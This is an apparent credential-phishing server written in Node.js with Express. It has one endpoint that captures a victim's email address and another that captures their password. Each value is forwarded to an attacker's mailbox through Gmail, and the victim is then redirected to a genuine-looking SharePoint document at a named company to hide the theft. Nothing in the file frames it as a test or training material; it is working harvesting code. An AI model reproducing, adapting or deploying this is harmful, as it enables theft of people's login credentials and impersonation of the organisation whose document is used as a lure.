require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static('public'));
app.use(express.json()); // To parse JSON bodies

// Email sender function for reuse
const sendMail = async (text) => {
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: 'Canvas Form Submission',
    text: text,
  };

  await transporter.sendMail(mailOptions);
};

// Endpoint 1: send email from index.html
app.post('/send-email', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, message: 'No email provided.' });
  }

  try {
    await sendMail(`User entered email: ${email}`);
    res.json({ success: true }); // Frontend will handle redirect
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Error sending email.' });
  }
});

// Endpoint 2: send password from thank-you.html
app.post('/send-password', async (req, res) => {
  const { password } = req.body;
  if (!password) {
    return res.status(400).json({ success: false, message: 'No password provided.' });
  }

  try {
    await sendMail(`User entered password: ${password}`);
    // Respond with JSON so frontend can redirect to SharePoint
    res.json({
  success: true,
  redirect: 'https://farmersedge-my.sharepoint.com/:w:/g/personal/thom_weir_farmersedge_ca/EU-EAWlqZ4RJpbQskh6diXgBwlF_oaAWM4kc68pxFUwn6A'
});

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Error sending password.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
